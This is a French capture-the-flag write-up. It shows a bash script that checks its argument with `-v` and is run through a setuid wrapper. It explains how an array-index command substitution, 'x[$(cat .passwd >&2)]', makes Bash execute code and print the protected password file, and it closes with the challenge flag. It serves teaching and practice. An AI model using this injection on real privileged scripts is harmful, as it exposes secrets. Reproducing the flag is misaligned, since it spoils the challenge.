```bash
#!/usr/bin/env bash

#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"

PASS=$(cat .passwd)

if [ ! -v "$1" ]; then
    echo "Try again ,-)"
    exit 1
fi


if test "$1" = "$PASS" 2>/dev/null  ; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi

exit 0
```

```bash
-r-xr-x---  1 app-script-ch21-cracked app-script-ch21  325 Feb 10  2024 ch21.sh
-rwsr-x---  1 app-script-ch21-cracked app-script-ch21 7304 Dec 10  2021 wrapper
```

### Solution

La comparaison finale avec `test "$1" = "$PASS"` n’est **pas impliquée** dans l’exploitation.
La fuite du mot de passe se produit **entièrement lors de l’évaluation de l’argument `$1` dans la condition `-v`**, avant même que le script ne décide d’entrer ou non dans le `if`.
L’exploitation repose exclusivement sur l’utilisation de `-v` avec un nom de variable de type tableau.
Lors de l’évaluation de `-v "$1"`, Bash doit résoudre le nom de la variable, ce qui implique l’évaluation de l’index du tableau.
Cette résolution entraîne l’exécution de toute substitution de commande présente dans l’index, indépendamment du reste du script.

```bash
./wrapper 'x[$(cat .passwd >&2)]'
```

- `./wrapper`  
    Exécute le script vulnérable.
- `'...'`  
    Argument passé tel quel au script grâce aux **guillemets simples**, empêchant toute expansion dans le shell appelant.
- `x[...]`  
    Nom de variable de type **tableau**, ce qui force Bash à résoudre l’index lors de l’évaluation de l’option `-v`.
- `$(cat .passwd >&2)`  
    Substitution de commande exécutée pendant la résolution de l’index du tableau, permettant de lire `.passwd` et d’en afficher le contenu sur la sortie d’erreur.

![[IMG-20260202144025474.png]]
### Flag

```
Qu0t1ng_Is_Not_Enough_298472
```
